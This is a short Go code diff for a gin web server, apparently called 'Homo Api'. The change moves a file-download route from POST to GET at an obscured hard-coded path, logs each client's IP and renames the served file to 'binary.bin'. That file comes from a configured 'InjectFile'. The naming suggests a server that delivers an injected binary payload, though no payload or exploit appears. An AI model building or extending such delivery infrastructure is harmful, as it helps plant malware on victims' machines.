@@ -7,6 +7,7 @@ import (
 	"os"
 	"strings"
 
+	"github.com/fatih/color"
 	"github.com/gin-gonic/gin"
 )
 
@@ -18,9 +19,9 @@ func StartApi(c *config.Config) {
 	router := gin.New()
 
 	if !c.Api.CustomPathEnabled {
-		router.POST("/SXkmarwet7vghj", File)
+		router.GET("/SXkmarwet7vghj", File)
 	} else {
-		router.POST(c.Api.CustomPath, File)
+		router.GET(c.Api.CustomPath, File)
 	}
 
 	router.GET("/DewmDCSjihfwj", Proxy)
@@ -33,7 +34,10 @@ func StartApi(c *config.Config) {
 }
 
 func File(c *gin.Context) {
-	c.FileAttachment(config.GetConfig().InjectFile.Linux, "binary_hn.bin")
+
+	color.Cyan("[Homo Api] New request: " + c.ClientIP())
+
+	c.FileAttachment(config.GetConfig().InjectFile.Linux, "binary.bin")
 }
 
 func Proxy(c *gin.Context) {
